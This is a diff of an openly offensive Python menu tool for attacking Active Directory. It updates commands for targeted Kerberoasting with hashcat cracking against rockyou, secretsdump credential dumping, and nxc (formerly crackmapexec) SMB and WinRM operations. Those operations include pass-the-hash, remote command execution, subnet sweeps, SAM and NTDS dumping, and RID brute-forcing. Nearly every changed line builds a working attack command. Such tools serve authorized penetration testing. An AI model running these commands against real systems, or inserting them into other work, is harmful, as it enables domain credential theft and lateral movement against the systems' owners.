@@ -928,7 +928,7 @@ powrDir = "LARX"
 fileExt = "py,sh,js,xlsx,docx,doc,txt,xml,bak,zip,php,html,pdf,dat,ps1"	# FILE EXTENSIONS
 keyPath = "python3 /usr/local/bin/" #/usr/share/doc/python3-impacket/examples/"  IMPACKET
 
- -------------------------------------------------------------------------------------
+# -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
 # Version : TREADSTONE                                                             
@@ -2620,11 +2620,11 @@ while True:
    if selection =='56':
       checkParam = test_DOM()                
       if checkParam != 1:
-         print(colored("[*] Peforming a tatargeted Roasting please wait this could take sometime ...", colour3))
+         print(colored("[*] Peforming a targeted Roasting please wait this could take sometime ...", colour3))
          localCOM(keyPath + "targetedKerberoast.py -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -o targetedroast.tmp 2>&1 > temp.tmp" )
          catsFile("targetedroast.tmp")
          print(colored("[*] Cracking hash values if they exists...\n", colour3))
-         localCOM("hashcat -m 18200 --force -a 0 targetedroast.tmp /usr/share/wordlists/rockyou.txt -o cracked2.tmp 2>&1 > temp.tmp")
+         localCOM("hashcat -m 13100 --force -a 0 targetedroast.tmp /usr/share/wordlists/rockyou.txt -o cracked2.tmp 2>&1 > temp.tmp")
          catsFile("cracked2.tmp")       
       prompt()
 
@@ -4400,10 +4400,10 @@ while True:
       if checkParam != 1:
          print(colored("[*] Enumerating, please wait...", colour3))         
          if PAS[:2] != "''":
-            remoteCOM(keyPath + "impacket-secretsdump '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + "' > secrets.tmp")
+            remoteCOM(keyPath + "secretsdump.py '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + "' > secrets.tmp")
          else:
             print("[i] Using HASH value as password credential...")
-            remoteCOM("/usr/bin/impacket-secretsdump '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "' -hashes ':" + NTM.rstrip(" ") + "' > secrets.tmp")                        
+            remoteCOM(keyPath + "secretsdump.py '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "' -hashes ':" + NTM.rstrip(" ") + "' > secrets.tmp")                        
          localCOM("sed -i '/:::/!d' secrets.tmp")
          localCOM("sort -u secrets.tmp > ssecrets.tmp")         
          count = lineCount("ssecrets.tmp")               	
@@ -4459,46 +4459,45 @@ while True:
             checkParam = test_PRT("5985")                                    
             if checkParam != 1:
                print("[+] Finding exploitable machines on the same subnet...\n")
-               remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + "/24")                         
+               remoteCOM("nxc winrm " + TIP.rstrip(" ") + "/24")                         
             checkParam = test_PRT("445")
             if checkParam != 1:
                print("\n[+] Checking priviliges...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -X whoami")
+               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -X whoami")
                print("\n[+] Enumerating users...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --users")               
+               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --users")               
                print("\n[+] Enumerating shares...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --shares")               
+               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --shares")               
                print("\n[+] Enumerating sessions...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --sessions")               
+               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --sessions")               
                print("\n[+] Enumerating SAM...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --sam")               
+               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --sam")               
                print("\n[+] Enumerating NTDS...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --ntds drsuapi")
+               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --ntds drsuapi")
                print("\n[+] Performing rid brute...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --rid-brute 20000")               
+               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --rid-brute 20000")               
          else:
             print("[i] Using HASH value as password credential...")
             checkParam = test_PRT("5985")
             if checkParam != 1:
                print("[+] Finding exploitable machines on the same subnet...\n")
-               remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + "/24")                    
+               remoteCOM("nxc winrm " + TIP.rstrip(" ") + "/24")                    
             checkParam = test_PRT("445")
             if checkParam != 1:
                print("\n[+] Checking priviliges...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' -X whoami")
+               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H '" + NTM.rstrip(" ") + "' -X whoami")
                print("\n[+] Enumerating users...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --users")               
+               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H '" + NTM.rstrip(" ") + "' --users")               
                print("\n[+] Enumerating shares...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --shares")               
+               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H '" + NTM.rstrip(" ") + "' --shares")               
                print("\n[+] Enumerating sessions...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --sessions")               
+               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H '" + NTM.rstrip(" ") + "' --sessions")               
                print("\n[+] Enumerating SAM...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --local-auth --sam")               
+               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H '" + NTM.rstrip(" ") + "' --local-auth --sam")               
                print("\n[+] Enumerating NTDS...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --local-auth --ntds drsuapi")
+               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H '" + NTM.rstrip(" ") + "' --local-auth --ntds drsuapi")
                print("\n[+] Performing rid brute...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --rid-brute 20000")
-      print("KNOWN CODING ERROR _ CRACKMAPEXEC EOF TERMINATION")
+               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H '" + NTM.rstrip(" ") + "' --rid-brute 20000")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
